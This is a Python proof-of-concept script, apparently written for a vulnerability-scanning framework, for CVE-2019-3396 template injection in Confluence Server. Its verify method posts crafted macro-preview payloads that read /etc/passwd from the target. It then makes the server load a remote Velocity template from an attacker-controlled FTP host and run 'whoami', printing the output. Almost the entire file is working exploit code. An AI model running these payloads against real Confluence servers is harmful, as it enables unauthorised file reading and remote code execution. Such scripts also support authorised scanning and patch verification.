from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re


POC_NAME = "Confluence_SSTI_CVE_2019_3396"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class Confluence_SSTI_CVE_2019_3396(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0057',    # PoC的VID编号
            'vbid': '',
            'Name': 'Confluence_SSTI_CVE_2019_3396',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-22',    # PoC创建时间
            },

        'vul': {
            'Product': 'Confluence Server and Confluence Data Center',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'SSTI RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                There was a server-side template injection vulnerability in Confluence Server and Data Center, in the Widget Connector. An attacker is able to exploit this issue to achieve path traversal and remote code execution on systems that run a vulnerable version of Confluence Server or Data Center.
            ''',    # 漏洞简要描述
            'DisclosureDate': '2019-04-12',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }


    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        filename1 = 'file:////etc/passwd'

        paylaod = urljoin(target,"/rest/tinymce/1/macro/preview")
        headers1 = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": target + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }
        data1 = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename1

        r1 = requests.post(paylaod, data=data1, headers=headers1)

        if r1.status_code == 200 and "confluence" in r1.text:
            m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r1.text, re.S)
            print("[+] Confluence SSTI CVE_2019_3396 success. fileread results: ", m[0])
        else:
            print("[+] Confluence SSTI CVE_2019_3396 failed.")


        # 以下是PoC的检测逻辑
        filename = "ftp://1.1.1.1/cmd.vm" # put the cmd.vm on your website (must use ftp or https ,http doesn't work ) (python -m pyftpdlib -p 21)
        url = urljoin(target,"/rest/tinymce/1/macro/preview")

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": target + "/pages/resumedraft.action?draftId=12345&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&",
            "Content-Type": "application/json; charset=utf-8"
        }

        cmd = "whoami"
        data = '{"contentId":"12345","macro":{"name":"widget","body":"","params":{"url":"http://www.dailymotion.com/video/xcpa64","width":"300","height":"200","_template":"%s","cmd":"%s"}}}' % (filename,cmd)

        r = requests.post(url, data=data, headers=headers)

        if r.status_code == 200 and "uid" in r.text:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = r.text
            if verbose:
                highlight("[+] url: " + url + " 存在Confluence SSTI CVE_2019_3396 RCE！！！")
                m = re.findall('.*wiki-content">\n(.*)\n            </div>\n', r.text, re.S)
                print("[+] default whoami command excecution results: ", m[0])
        else:
            if verbose:
                highlight("[+] url: " + url + " 不存在Confluence SSTI CVE_2019_3396 RCE！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)